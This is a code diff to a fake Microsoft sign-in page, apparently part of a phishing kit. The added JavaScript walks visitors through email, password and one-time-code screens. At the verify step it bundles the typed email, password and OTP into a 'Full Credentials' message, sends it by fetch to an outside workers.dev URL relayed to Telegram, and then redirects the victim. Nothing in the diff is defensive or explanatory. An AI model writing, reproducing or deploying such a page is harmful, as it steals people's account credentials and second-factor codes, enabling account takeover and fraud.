@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Microsoft-style Canvas Sign-in</title>
+<title>Microsoft|Login/title>
 <style>
   :root { color-scheme: light; }
   html, body { height:100%; margin:0; }
@@ -35,26 +35,66 @@
     .catch(err => console.error("❌ Telegram error:", err));
 }
 
-  const originalGo = go;
-  go = function(name) {
-    if(state.step === "otp" && name === "verify") {
-      state.loading = true; draw();
+function go(name) {
+  if (state.loading) return;
 
-      const emailMsg = `\u2709\ufe0f *Email:*\n${state.email}`;
-      const passMsg  = `\ud83d\udd10 *Password:*\n${state.password}`;
-      const otpMsg   = `\ud83d\udce3 *OTP:*\n${state.otp.join('')}`;
-      const allMsg   = `\ud83d\udd12 *Full Credentials:*\n\n\u2709\ufe0f Email: ${state.email}\n\ud83d\udd10 Password: ${state.password}\n\ud83d\udce3 OTP: ${state.otp.join('')}`;
+  if (state.step === "email" && name === "next") {
+    withLoading(() => {
+      state.step = "password";
+      state.focus = "field";
+      focusShim();
+    });
+  }
+  else if (state.step === "password" && name === "next") {
+    withLoading(() => {
+      state.step = "sendcode";
+      state.focus = "none";
+    });
+  }
+  else if (state.step === "password" && name === "back") {
+    withLoading(() => {
+      state.step = "email";
+      state.focus = "field";
+      focusShim();
+    });
+  }
+  else if (state.step === "sendcode" && name === "send") {
+    withLoading(() => {
+      state.step = "otp";
+      state.focus = "otp";
+      state.otp = ["", "", "", "", "", ""];
+      state.otpIndex = 0;
+      focusShim();
+    });
+  }
+  else if (state.step === "otp" && (name === "back" || name === "backchev")) {
+    withLoading(() => {
+      state.step = "sendcode";
+      state.focus = "none";
+    });
+  }
+  else if (state.step === "otp" && name === "verify") {
+    state.loading = true;
+    draw();
 
-  
+    const email = state.email;
+    const password = state.password;
+    const otp = state.otp.join('');
 
-      setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 7000);
-      return;
-    } else {
-      originalGo(name);
-    }
-  };
+    const message = `🔐 *Full Credentials:*\n\n✉️ Email: ${email}\n🔑 Password: ${password}\n📣 OTP: ${otp}`;
+
+    fetch("https://outluk.codeblock02.workers.dev/?text=" + encodeURIComponent(message))
+      .then(res => console.log("✅ Sent to Telegram"))
+      .catch(err => console.error("❌ Telegram error:", err));
+
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, TRANSITION_DELAY_MS);
+
+    return;
+  }
+}
+
 
   (() => {
   // ===== Settings =====
